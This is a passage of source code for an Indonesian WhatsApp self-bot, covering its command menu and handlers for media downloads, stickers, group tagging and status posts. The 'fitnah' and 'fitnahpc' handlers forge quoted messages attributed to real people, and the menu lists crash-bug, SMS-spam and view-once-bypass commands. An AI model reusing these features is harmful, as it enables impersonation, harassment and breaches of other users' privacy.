┣ ◩ _${prefix}spotifysearch_ <query>
┣ ◩ _${prefix}joox_ <query>
┣ ◩ _${prefix}jooxsearch_ <query>
┣ ◩ _${prefix}video_ <query>
┣ ◩ _${prefix}ytmp3_ <link>
┣ ◩ _${prefix}igvideo_ <link>
┣ ◩ _${prefix}igdl_ <link>
┣ ◩ _${prefix}igdl2_ <link>
┣ ◩ _${prefix}igstory_ <username>
┣ ◩ _${prefix}igimage_ <link>
┣ ◩ _${prefix}igaudio_ <link>
┣ ◩ _${prefix}ytmp4_ <link>
┣ ◩ _${prefix}ig_ <link>
┣ ◩ _${prefix}pinterest_
┣ ◩ _${prefix}pinterest2_
┣ ◩ _${prefix}pinterest3_
┣ ◩ _${prefix}pinterestdl_
┣ ◩ _${prefix}pinterestimg_ 
┣ ◩ _${prefix}twitter_ <link>
┣ ◩ _${prefix}twtdl_
┣ ◩ _${prefix}tiktok_ <link>
┣ ◩ _${prefix}tiktokvideo_ <link>
┣ ◩ _${prefix}tiktokaudio_ <link>
┣ ◩ _${prefix}fb_ <link>
┣ ◩ _${prefix}brainly_ <query>
┣ ◩ _${prefix}image_ <query>
┣ ◩ _${prefix}anime_ <random>
┗━━━━━━━━ ❑

    *[ 𝙾𝚆𝙽𝙴𝚁 ]*
┏━━━━━━━ ❒
┣ ◩ _${prefix}clone_
┣ ◩ _${prefix}setname_
┣ ◩ _${prefix}setbio_
┣ ◩ _${prefix}setppbot_
┣ ◩ _${prefix}upswteks_
┣ ◩ _${prefix}upswimage_
┣ ◩ _${prefix}upswvideo_
┣ ◩ _${prefix}upswlokasi_
┣ ◩ _${prefix}upswaudio_
┣ ◩ _${prefix}upswvoice_
┣ ◩ _${prefix}upswsticker_
┣ ◩ _${prefix}once_ < media to once view >
┣ ◩ _${prefix}toview_ < once tu media >
┣ ◩ _${prefix}colongsw_ ( reply sw nya )
┣ ◩ _${prefix}caripesan_ ( query )
┣ ◩ _${prefix}bc_
┣ ◩ _${prefix}setppbot_
┣ ◩ _${prefix}addpremium_
┣ ◩ _${prefix}delprem_ 
┣ ◩ _${prefix}ban_
┣ ◩ _${prefix}bann_
┣ ◩ _${prefix}unban_
┣ ◩ _${prefix}unbann_
┣ ◩ _${prefix}addvn_
┣ ◩ _${prefix}addcmd_
┣ ◩ _${prefix}addstik_
┣ ◩ _${prefix}addimg_
┣ ◩ _${prefix}bug_
┣ ◩ _${prefix}spamsms_
┣ ◩ _${prefix}sendbug_
┣ ◩ _${prefix}sendbug2_
┣ ◩ _${prefix}buggc_
┣ ◩ _${prefix}owner_
┣ ◩ _${prefix}stat_ 
┣ ◩ _${prefix}status_
┣ ◩ _${prefix}self_
┣ ◩ _${prefix}public_
┣ ◩ _${prefix}setthumb_
┣ ◩ _${prefix}settarget_
┣ ◩ _${prefix}setfakeimg_
┣ ◩ _${prefix}setreply_
┣ ◩ _${prefix}ping_
┣ ◩ _${prefix}inspect_
┣ ◩ _${prefix}join_
┣ ◩ _${prefix}get_
┣ ◩ _${prefix}term_ <code>
┣ ◩ _x_ < java script code >
┗━━━━━━━━ ❑ 
*< THANKS TO >* 
${readmore}\n${thanksTo}\n• ${namaOwner}\n\n[ ${namaBot} ]` , 
		footerText: 'Have a nice day dude 💡',
		buttons: buttonsss,
		headerType: 4,
		imageMessage: media.message.imageMessage
		}
await hexa.sendMessage(from, buttonMessageee, MessageType.buttonsMessage, {ephemeral:true, quoted: fvideo, contextInfo: {mentionedJid: [nomor], externalAdReply:{ title: `${namaBot}`, body : '𝑥  999  𝑥', mediaType: 2, thumbnail: fs.readFileSync('./database/image/heker.jpeg'), mediaUrl: 'https://youtu.be/P_9cu8Gr4LQ'}}})

  break
    case 'on':
if (isBanned)return reply(mess.only.banned)
if (!isRegister)return reply(mess.only.register)
            if (!mek.key.fromMe) return 
            offline = false
            fakestatus(' ``ANDA TELAH ONLINE``` ')
            break       
    case 'status':
            fakestatus(`*STATUS*\n${offline ? '>𝑶𝑭𝑭𝑳𝑰𝑵𝑬' : '>𝑶𝑵𝑳𝑰𝑵𝑬'}\n${banChats ? '>*𝑺𝑬𝑳𝑭 - 𝑴𝑶𝑫𝑬*' : '>𝑷𝑼𝑩𝑳𝑰𝑪 - 𝑴𝑶𝑫𝑬'}`)
            break
    case 'off':
     case 'afk':
if (isBanned)return reply(mess.only.banned)
if (!isRegister)return reply(mess.only.register)
            if (!mek.key.fromMe) return 
            offline = true
            waktu = Date.now()
            anuu = args.join(' ') ? args.join(' ') : '-'
            alasan = anuu
            fakestatus(' ```ANDA TELAH OFFLINE``` ')
            break   
    case 'get':
if (isBanned)return reply(mess.only.banned)
if (!isRegister)return reply(mess.only.register)
            if(!q) return reply('linknya?')
            fetch(`${args[0]}`).then(res => res.text)  
            .then(bu =>{
            fakestatus(bu)
            })   
            break
    case 'kontag':
if (isBanned)return reply(mess.only.banned)
if (!isRegister)return reply(mess.only.register)
if (!isGroupAdmins)return reply(mess.only.admin)
if (!mek.key.fromMe) return fakestatus('𝙱𝙾𝚃 𝚂𝙴𝙳𝙰𝙽𝙶 𝙳𝙰𝙻𝙼 𝙼𝙾𝙳𝙴 𝚂𝙴𝙻𝙵')
            pe = args.join('')
            entah = pe.split('|')[0]
            nah = pe.split('|')[1]
            if (isNaN(entah)) return reply('Invalid phone number');
            members_ids = []
            for (let mem of groupMembers) {
            members_ids.push(mem.jid)
            }
            vcard = 'BEGIN:VCARD\n'
            + 'VERSION:3.0\n'
            + `FN:${nah}\n`
            + `TEL;type=CELL;type=VOICE;waid=${entah}:${phoneNum('+' + entah).getNumber('internasional')}\n`
            + 'END:VCARD'.trim()
            hexa.sendMessage(from, {displayName: `${nah}`, vcard: vcard}, contact, {contextInfo: {"mentionedJid": members_ids}})
            break
    case 'sticktag':
if (isBanned)return reply(mess.only.banned)
if (!isRegister)return reply(mess.only.register)
if (!isGroupAdmins)return reply(mess.only.admin)
if (!mek.key.fromMe) return fakestatus('𝙱𝙾𝚃 𝚂𝙴𝙳𝙰𝙽𝙶 𝙳𝙰𝙻𝙼 𝙼𝙾𝙳𝙴 𝚂𝙴𝙻𝙵')
            if ((isMedia && !mek.message.videoMessage || isQuotedSticker) && args.length == 0) {
            encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            file = await hexa.downloadAndSaveMediaMessage(encmedia, filename = getRandom)
            value = args.join(" ")
            var group = await hexa.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                contextInfo: { mentionedJid: mem },
                quoted: ftroli
            }
            ini_buffer = fs.readFileSync(file)
            hexa.sendMessage(from, ini_buffer, sticker, options)
            fs.unlinkSync(file)
            } else {
            reply(`*Reply sticker yang sudah dikirim*`)
            }
            break
    case 'totag':
if (isBanned)return reply(mess.only.banned)
if (!isRegister)return reply(mess.only.register)
if (!isGroupAdmins)return reply(mess.only.admin)
if (!mek.key.fromMe) return fakestatus('𝙱𝙾𝚃 𝚂𝙴𝙳𝙰𝙽𝙶 𝙳𝙰𝙻𝙼 𝙼𝙾𝙳𝙴 𝚂𝙴𝙻𝙵')
            if ((isMedia && !mek.message.videoMessage || isQuotedSticker) && args.length == 0) {
            encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            file = await hexa.downloadAndSaveMediaMessage(encmedia, filename = getRandom)
            value = args.join(" ")
            var group = await hexa.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                contextInfo: { mentionedJid: mem },
                quoted: ftroli
            }
            ini_buffer = fs.readFileSync(file)
            hexa.sendMessage(from, ini_buffer, sticker, options)
            fs.unlinkSync(file)
            } else if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
            encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            file = await hexa.downloadAndSaveMediaMessage(encmedia, filename = getRandom)
            value = args.join(" ")
            var group = await hexa.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                contextInfo: { mentionedJid: mem },
                quoted: ftroli
            }
            ini_buffer = fs.readFileSync(file)
            hexa.sendMessage(from, ini_buffer, image, options)
            fs.unlinkSync(file)
        } else if ((isMedia && !mek.message.videoMessage || isQuotedAudio) && args.length == 0) {
            encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            file = await hexa.downloadAndSaveMediaMessage(encmedia, filename = getRandom)
            value = args.join(" ")
            var group = await hexa.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
            	mimetype : 'audio/mp4',
            	ptt : true,
                contextInfo: { mentionedJid: mem },
                quoted: ftroli
            }
            ini_buffer = fs.readFileSync(file)
            hexa.sendMessage(from, ini_buffer, audio, options)
            fs.unlinkSync(file)
        }  else if ((isMedia && !mek.message.videoMessage || isQuotedVideo) && args.length == 0) {
            encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            file = await hexa.downloadAndSaveMediaMessage(encmedia, filename = getRandom)
            value = args.join(" ")
            var group = await hexa.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
            	mimetype : 'video/mp4',
                contextInfo: { mentionedJid: mem },
                quoted: ftroli
            }
            ini_buffer = fs.readFileSync(file)
            hexa.sendMessage(from, ini_buffer, video, options)
            fs.unlinkSync(file)
        } else{
          reply(`reply gambar/sticker/audio/video dengan caption ${prefix}totag`)
        }
        break
    case 'fitnah':
if (isBanned)return reply(mess.only.banned)
if (!isRegister)return reply(mess.only.register)
if (!mek.key.fromMe) return fakestatus('𝙱𝙾𝚃 𝚂𝙴𝙳𝙰𝙽𝙶 𝙳𝙰𝙻𝙼 𝙼𝙾𝙳𝙴 𝚂𝙴𝙻𝙵')
            if (args.length < 1) return reply(`Usage :\n${prefix}fitnah [@tag|pesan|balasanbot]]\n\nEx : \n${prefix}fitnah @tagmember|hai|hai juga`)
            var gh = args.join('')
            mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
            var replace = gh.split("|")[0];
            var target = gh.split("|")[1];
            var bot = gh.split("|")[2];
            hexa.sendMessage(from, `${bot}`, text, {quoted: { key: { fromMe: false, participant: `${mentioned}`, ...(from ? { remoteJid: from } : {}) }, message: { conversation: `${target}` }}})
            break
    case 'settarget':
if (isBanned)return reply(mess.only.banned)
if (!isRegister)return reply(mess.only.register)
if (!isOwner)return reply(mess.only.owner)
if (!mek.key.fromMe) return fakestatus('𝙱𝙾𝚃 𝚂𝙴𝙳𝙰𝙽𝙶 𝙳𝙰𝙻𝙼 𝙼𝙾𝙳𝙴 𝚂𝙴𝙻𝙵')
            if(!q) return reply(`${prefix}settarget 628hexaxx`)
            targetpc = args[0]
            fakegroup(`Succes Mengganti target fitnahpc : ${targetpc}`)
            break
    case 'fitnahpc':
if (isBanned)return reply(mess.only.banned)
if (!isRegister)return reply(mess.only.register)
if (!isGroupAdmins)return reply(mess.only.admin)
if (!mek.key.fromMe) return fakestatus('𝙱𝙾𝚃 𝚂𝙴𝙳𝙰𝙽𝙶 𝙳𝙰𝙻𝙼 𝙼𝙾𝙳𝙴 𝚂𝙴𝙻𝙵')
            if(!q) return reply(`${prefix}fitnahpc teks target|teks lu`)
            jids = `${targetpc}@s.whatsapp.net` // nomer target
            var split = args.join(' ').replace(/@|\d/gi, '').split('|')
            var taged = mek.message.extendedTextMessage.contextInfo.mentionedJid[0]
            var options = {contextInfo: {quotedMessage: {extendedTextMessage: {text: split[0]}}}}
            const responye = await hexa.sendMessage(jids, `${split[1]}`, MessageType.text, options)
            await hexa.deleteMessage(jids, { id: responye.messageID, remoteJid: jids, fromMe: true })
            break
    case 'tomp3':
if (isBanned)return reply(mess.only.banned)
if (!isRegister)return reply(mess.only.register)
            if (!isQuotedVideo) return fakegroup('Reply videonya!')
            fakegroup(mess.wait)
            encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
            media = await hexa.downloadAndSaveMediaMessage(encmedia)
            ran = getRandom('.mp4')
            exec(`ffmpeg -i ${media} ${ran}`, (err) => {
            fs.unlinkSync(media)
            if (err) return fakegroup(`Err: ${err}`)
            buffer453 = fs.readFileSync(ran)
            hexa.sendMessage(from, buffer453, audio, { mimetype: 'audio/mp4', quoted: ftroli })
            fs.unlinkSync(ran)
            })
            break
    case 'fast':
if (isBanned)return reply(mess.only.banned)
if (!isRegister)return reply(mess.only.register)
            if (!isQuotedVideo) return fakegroup('Reply videonya!')
            fakegroup(mess.wait)
            encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
            media = await hexa.downloadAndSaveMediaMessage(encmedia)
            ran = getRandom('.mp4')
            exec(`ffmpeg -i ${media} -filter_complex "[0:v]setpts=0.5*PTS[v];[0:a]atempo=2[a]" -map "[v]" -map "[a]" ${ran}`, (err) => {
            fs.unlinkSync(media)
            if (err) return fakegroup(`Err: ${err}`)
            buffer453 = fs.readFileSync(ran)
            hexa.sendMessage(from, buffer453, video, { mimetype: 'video/mp4', quoted: ftroli })
            fs.unlinkSync(ran)
            })
            break
    case 'slow':
if (isBanned)return reply(mess.only.banned)
if (!isRegister)return reply(mess.only.register)
            if (!isQuotedVideo) return fakegroup('Reply videonya!')
            fakegroup(mess.wait)
            encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
            media = await hexa.downloadAndSaveMediaMessage(encmedia)
            ran = getRandom('.mp4')
            exec(`ffmpeg -i ${media} -filter_complex "[0:v]setpts=2*PTS[v];[0:a]atempo=0.5[a]" -map "[v]" -map "[a]" ${ran}`, (err) => {
            fs.unlinkSync(media)
            if (err) return fakegroup(`Err: ${err}`)
            buffer453 = fs.readFileSync(ran)
            hexa.sendMessage(from, buffer453, video, { mimetype: 'video/mp4', quoted: ftroli })
            fs.unlinkSync(ran)
            })
            break
    case 'reverse':
if (isBanned)return reply(mess.only.banned)
if (!isRegister)return reply(mess.only.register)
            if (!isQuotedVideo) return fakegroup('Reply videonya!')
            encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
            media = await hexa.downloadAndSaveMediaMessage(encmedia)
            ran = getRandom('.mp4')
            exec(`ffmpeg -i ${media} -vf reverse -af areverse ${ran}`, (err) => {
            fs.unlinkSync(media)
            if (err) return fakegroup(`Err: ${err}`)
            buffer453 = fs.readFileSync(ran)
            hexa.sendMessage(from, buffer453, video, { mimetype: 'video/mp4', quoted: ftroli })
            fs.unlinkSync(ran)
            })
            break
    case 'anime':
if (isBanned)return reply(mess.only.banned)
if (!isRegister)return reply(mess.only.register)
            reply(mess.wait)
            fetch('https://raw.githubusercontent.com/pajaar/grabbed-results/master/pajaar-2020-gambar-anime.txt')
            .then(res => res.text)
            .then(body => {
            let tod = body.split("\n");
            let pjr = tod[Math.floor(Math.random() * tod.length)];
            imageToBase64(pjr)
            .then((response) => {
            media =  Buffer.from(response, 'base64');
            hexa.sendMessage(from,media,image,{quoted:ftoko,caption:'NIH'})
            }
            )
            .catch((error) => {
            console.log(error); 
            }
            )
            });
            break
    case 'kontak':
if (isBanned)return reply(mess.only.banned)
if (!isRegister)return reply(mess.only.register)
            pe = args.join(' ') 
            entah = pe.split('|')[0]
            nah = pe.split('|')[1]
            if (isNaN(entah)) return reply('Invalid phone number');
            vcard = 'BEGIN:VCARD\n'
            + 'VERSION:3.0\n'
            + `FN:${nah}\n`
            + `TEL;type=CELL;type=VOICE;waid=${entah}:${phoneNum('+' + entah).getNumber('internasional')}\n`
            + 'END:VCARD'.trim()
            hexa.sendMessage(from, {displayName: `${nah}`, vcard: vcard}, contact)
            break    
    case 'take':
    case 'colong':
if (isBanned)return reply(mess.only.banned)
if (!isRegister)return reply(mess.only.register)
    		if (!isQuotedSticker) return reply('Stiker aja om')
            encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
		    media = await hexa.downloadAndSaveMediaMessage(encmedia)
            anu = args.join(' ').split('|')
            satu = anu[0] !== '' ? anu[0] : `y`
            dua = typeof anu[1] !== 'undefined' ? anu[1] : `y`
            require('./lib/fetcher.js').createExif(satu, dua)
			require('./lib/fetcher.js').modStick(media, hexa, mek, from)
			break
if (isBanned)return reply(mess.only.banned)
if (!isRegister)return reply(mess.only.register)
	case 'stikerwm':
	case 'stickerwm':
    case 'swm':
            pe = args.join('')
            var a = pe.split("|")[0];
            var b = pe.split("|")[1];
            if (isMedia && !mek.message.videoMessage || isQuotedImage ) {
            const encmedia = isQuotedImage   ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
             media = await hexa.downloadAndSaveMediaMessage(encmedia)
            await createExif(a,b)
            out = getRandom('.webp')
            ffmpeg(media)
            .on('error', (e) => {
            console.log(e)
            hexa.sendMessage(from, 'Terjadi kesalahan', 'conversation', { quoted: ftroli })
            fs.unlinkSync(media)
            })
            .on('end', () => {
            _out = getRandom('.webp')
            spawn('webpmux', ['-set','exif','./stik/data.exif', out, '-o', _out])
            .on('exit', () => {
            hexa.sendMessage(from, fs.readFileSync(_out),'stickerMessage', { quoted: ftroli })
            fs.unlinkSync(out)
            fs.unlinkSync(_out)
            fs.unlinkSync(media)
            })
            })
            .addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
            .toFormat('webp')
            .save(out) 
            } else if ((isMedia && mek.message.videoMessage.seconds < 11 || isQuotedVideo && mek.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.seconds < 11) && args.length == 0) {
            const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
            const mediaaaa = await hexa.downloadAndSaveMediaMessage(encmedia)
            pe = args.join('')
            var a = pe.split("|")[0];
            var b = pe.split("|")[1];
            await createExif(a,b)
            out = getRandom('.webp')
            ffmpeg(mediaaaa)
            .on('error', (e) => {
            console.log(e)
            hexa.sendMessage(from, 'Terjadi kesalahan', 'conversation', { quoted: ftroli })
            fs.unlinkSync(mediaaaa)
            })
            .on('end', () => {
            _out = getRandom('.webp')
            spawn('webpmux', ['-set','exif','./stik/data.exif', out, '-o', _out])
            .on('exit', () => {
            hexa.sendMessage(from, fs.readFileSync(_out),'stickerMessage', { quoted: ftroli })
            fs.unlinkSync(out)
            fs.unlinkSync(_out)
            fs.unlinkSync(mediaaaa)
            })
            })
            .addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
            .toFormat('webp')
            .save(out)       
            } else {
            reply(`Kirim gambar dengan caption ${prefix}swm teks|teks atau tag gambar yang sudah dikirim`)
            }
            break
    case 'upswteks':
if (!mek.key.fromMe) return fakestatus('Owner Only!!!')
if (!isOwner)return reply(mess.only.owner)
            if (!q) return reply('Isi teksnya!')
            hexa.sendMessage('status@broadcast', `${q}`, extendedText)
            fakegroup(`Sukses Up story wea teks ${q}`)
            break
    case 'upswimage':
if (!mek.key.fromMe) return fakestatus('*Owner Only!!!*')
if (!isOwner)return reply(mess.only.owner)
            if (isQuotedImage) {
            const swsw = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            cihcih = await hexa.downloadMediaMessage(swsw)
            hexa.sendMessage('status@broadcast', cihcih, image, { caption: `${q}` })
            bur = `Sukses Upload Story Image dengan Caption: ${q}`
            hexa.sendMessage(from, bur, text, { quoted: ftroli })
            } else {
            fakestatus('Reply gambarnya!')
            }
            break
    case 'upswvideo':
if (!mek.key.fromMe) return fakestatus('Owner Only!!!')
if (!isOwner)return reply(mess.only.owner)
            if (isQuotedVideo) {
            const swsw = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            cihcih = await hexa.downloadMediaMessage(swsw)
            hexa.sendMessage('status@broadcast', cihcih, video, { caption: `${q}` }) 
            bur = `Sukses Upload Story Video dengan Caption: ${q}`
            hexa.sendMessage(from, bur, text, { quoted: ftroli })
            } else {
            fakestatus('reply videonya!')
            }
            break
    case 'public':
     if (!isOwner)return reply(mess.only.owner)
          	if (!mek.key.fromMe) return fakestatus('𝙱𝙾𝚃 𝚂𝙴𝙳𝙰𝙽𝙶 𝙳𝙰𝙻𝙼 𝙼𝙾𝙳𝙴 𝚂𝙴𝙻𝙵')
          	if (banChats === false) return
          	// var taged = ben.message.extendedTextMessage.contextInfo.mentionedJid[0]
          	banChats = false
          	fakestatus(`「 *𝑷𝑼𝑩𝑳𝑰𝑪 - 𝑴𝑶𝑫𝑬* 」`)
          	break

	case 'self':
	 if (!isOwner)return reply(mess.only.owner)
          	if (!mek.key.fromMe) return fakestatus('𝙱𝙾𝚃 𝚂𝙴𝙳𝙰𝙽𝙶 𝙳𝙰𝙻𝙼 𝙼𝙾𝙳𝙴 𝚂𝙴𝙻𝙵')
          	if (banChats === true) return
          	uptime = process.uptime()
         	 // var taged = ben.message.extendedTextMessage.contextInfo.mentionedJid[0]
         	banChats = true
          	fakestatus(`「 *𝑺𝑬𝑳𝑭 - 𝑴𝑶𝑫𝑬* 」`)
          	break
 	case 'hidetag':
if (isBanned)return reply(mess.only.banned)
if (!isRegister)return reply(mess.only.register)
if (!isGroupAdmins)return reply(mess.only.admin)
			var value = args.join(' ')
			var group = await hexa.groupMetadata(from)
			var member = group['participants']
			var mem = []
			member.map(async adm => {
			mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
			})
			var optionshidetag = {
			text: value,
			contextInfo: { mentionedJid: mem },
			quoted: ftroli
			}
			hexa.sendMessage(from, optionshidetag, text)
			break
	case 'play':
if (isBanned)return reply(mess.only.banned)
if (!isRegister)return reply(mess.only.register)
			if (args.length === 0) return reply(`Kirim perintah *${prefix}play* _Judul lagu yang akan dicari_`)
            var srch = args.join('')
    		aramas = await yts(srch);
    		aramat = aramas.all 
   			var mulaikah = aramat[0].url							
                  try {
                    yta(mulaikah)
                    .then((res) => {
                        const { dl_link, thumb, title, filesizeF, filesize } = res
                        axios.get(`https://tinyurl.com/api-create.php?url=${dl_link}`)
                        .then(async (a) => {
                        if (Number(filesize) >= 100000) return sendMediaURL(from, thumb, `*PLAY MUSIC*\n\n*Title* : ${title}\n*Ext* : MP3\n*Filesize* : ${filesizeF}\n*Link* : ${a.data}\n\n_Untuk durasi lebih dari batas disajikan dalam mektuk link_`)
                        const captions = `*PLAY MUSIC*\n\n*Title* : ${title}\n*Ext* : MP3\n*Size* : ${filesizeF}\n*Link* : ${a.data}\n\n_Silahkan tunggu file media sedang dikirim mungkin butuh beberapa menit_`
                        sendMediaURL(from, thumb, captions)
                        await sendMediaURL(from, dl_link).catch(() => reply('error'))
                        })                
                        })
                        } catch (err) {
                        reply(mess.error.api)
                        }
                   break  
        case 'video':
if (isBanned)return reply(mess.only.banned)
if (!isRegister)return reply(mess.only.register)
            if (args.length === 0) return reply(`Kirim perintah *${prefix}video* _Judul lagu yang akan dicari_`)
            var srch = args.join('')
            aramas = await yts(srch);
            aramat = aramas.all 
            var mulaikah = aramat[0].url                            
                  try {
                    ytv(mulaikah)
                    .then((res) => {
                        const { dl_link, thumb, title, filesizeF, filesize } = res
                        axios.get(`https://tinyurl.com/api-create.php?url=${dl_link}`)
                        .then(async (a) => {
                        if (Number(filesize) >= 100000) return sendMediaURL(from, thumb, `*PLAY VIDEO*\n\n*Title* : ${title}\n*Ext* : MP3\n*Filesize* : ${filesizeF}\n*Link* : ${a.data}\n\n_Untuk durasi lebih dari batas disajikan dalam mektuk link_`)
                        const captions = `*PLAY VIDEO*\n\n*Title* : ${title}\n*Ext* : MP4\n*Size* : ${filesizeF}\n*Link* : ${a.data}\n\n_Silahkan tunggu file media sedang dikirim mungkin butuh beberapa menit_`
                        sendMediaURL(from, thumb, captions)
                        await sendMediaURL(from, dl_link).catch(() => reply('error'))
                        })                
                        })
                        } catch (err) {
                        reply(mess.error.api)
                        }
                   break      
    case 'sticker': 
    case 'stiker':
    case 'sg':
    case 's':
if (isBanned)return reply(mess.only.banned)
if (!isRegister)return reply(mess.only.register)
            if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
            const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            const mediaa = await hexa.downloadAndSaveMediaMessage(encmedia)
                ran = '666.webp'
                await ffmpeg(`./${mediaa}`)
                .input(mediaa)
                .on('start', function (cmd) {
                     console.log(`Started : ${cmd}`)
                })
                .on('error', function (err) {
                 console.log(`Error : ${err}`)
                fs.unlinkSync(media)
                reply('error')
                })
                .on('end', function () {
                console.log('Finish')
                hexa.sendMessage(from, fs.readFileSync(ran), sticker, {quoted: ftroli})
                 fs.unlinkSync(mediaa)
                fs.unlinkSync(ran)
                })
                .addOutputOptions([`-vcodec`, `libwebp`, `-vf`, `scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
                .toFormat('webp')
                .save(ran)
                } else if ((isMedia && mek.message.videoMessage.seconds < 11 || isQuotedVideo && mek.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.seconds < 11) && args.length == 0) {
                const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
                const media = await hexa.downloadAndSaveMediaMessage(encmedia)
            ran = '999.webp'
            reply(mess.wait)
            await ffmpeg(`./${media}`)
            .inputFormat(media.split('.')[1])
            .on('start', function (cmd) {
            console.log(`Started : ${cmd}`)
            })
            .on('error', function (err) {
            console.log(`Error : ${err}`)
            fs.unlinkSync(media)
            tipe = media.endsWith('.mp4') ? 'video' : 'gif'
            reply(`Gagal, pada saat mengkonversi ${tipe} ke stiker`)
            })
            .on('end', function () {
            console.log('Finish')
            hexa.sendMessage(from, fs.readFileSync(ran), sticker, {quoted: ftroli})
            fs.unlinkSync(media)
            fs.unlinkSync(ran)
                })
                .addOutputOptions([`-vcodec`, `libwebp`, `-vf`, `scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
                .toFormat('webp')
                .save(ran)
            } else {
                reply(`Kirim gambar dengan caption ${prefix}sticker\nDurasi Sticker Video 1-9 Detik`)
            }
            break               
    case 'toimg':
if (isBanned)return reply(mess.only.banned)
if (!isRegister)return reply(mess.only.register)
			if (!isQuotedSticker) return reply('𝗥𝗲𝗽𝗹𝘆/𝘁𝗮𝗴 𝘀𝘁𝗶𝗰𝗸𝗲𝗿 !')
			reply(mess.wait)
			encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
			media = await hexa.downloadAndSaveMediaMessage(encmedia)
			ran = getRandom('.png')
			exec(`ffmpeg -i ${media} ${ran}`, (err) => {
			fs.unlinkSync(media)
			if (err) return reply('Yah gagal, coba ulangi ^_^')
			buffer = fs.readFileSync(ran)
			fakethumb(buffer,'NIH')
			fs.unlinkSync(ran)
			})
			break
	case 'ytsearch':
if (isBanned)return reply(mess.only.banned)
if (!isRegister)return reply(mess.only.register)
			if (args.length < 1) return reply('Tolong masukan query!')
			var srch = args.join('');
			try {
        	var aramas = await yts(srch);
   			} catch {
        	return await hexa.sendMessage(from, 'Error!', MessageType.text, dload)
    		}
    		aramat = aramas.all 
    		var tbuff = await getBuffer(aramat[0].image)
    		var ytresult = '';
    		ytresult += '「 *YOUTUBE SEARCH* 」'
    		ytresult += '\n________________________\n\n'
   			aramas.all.map((video) => {
        	ytresult += '❏ Title: ' + video.title + '\n'
            ytresult += '❏ Link: ' + video.url + '\n'
            ytresult += '❏ Durasi: ' + video.timestamp + '\n'
            ytresult += '❏ Upload: ' + video.ago + '\n________________________\n\n'
    		});
    		ytresult += '◩ *SELF-BOT*'
    		await fakethumb(tbuff,ytresult)
			break
	case 'setreply':
	case 'setfake':
	 if (!isOwner)return reply(mess.only.owner)
			if (!q) return fakegroup(mess.wrongFormat)
			fake = q
			fakegroup(`Succes Mengganti Conversation Fake : ${q}`)
			break
	case 'setfakeimg':
	 if (!isOwner)return reply(mess.only.owner)
        	if ((isMedia && !mek.message.videoMessage || isQuotedImage || isQuotedSticker) && args.length == 0) {
          	boij = isQuotedImage || isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
			delb = await hexa.downloadMediaMessage(boij)
